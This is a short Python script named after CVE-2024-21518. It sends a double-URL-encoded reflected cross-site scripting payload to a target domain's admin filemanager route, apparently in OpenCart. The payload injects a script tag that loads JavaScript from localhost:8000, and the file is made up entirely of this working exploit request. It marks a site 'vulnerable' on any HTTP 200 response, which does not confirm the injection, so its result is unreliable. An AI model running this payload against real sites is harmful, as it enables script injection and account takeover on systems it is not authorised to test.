import requests
import datetime

class cve_2024_21518():
    def request_xss(self, domain):
        payload = '/admin/index.php?route=common/filemanager.list&directory=demo%2522%253E%253Cscript%2Bsrc%253D%2522http%253A%252F%252Flocalhost%253A8000%252Foc.js%2522%253E%253C%252Fscript%253E%253Cinput%2Btype%253D%2522hidden'
        url = 'https://'+domain+payload
        access_url = requests.get(url, allow_redirects=True)    
        time = datetime.datetime.now()
        if access_url.status_code == 200: return f'[{time.hour}:{time.minute}:{time.microsecond}] CVE-2024-21518 : vulnerable'
        else: return f'[{time.hour}:{time.minute}:{time.microsecond}] CVE-2024-21518 : not vulnerable'
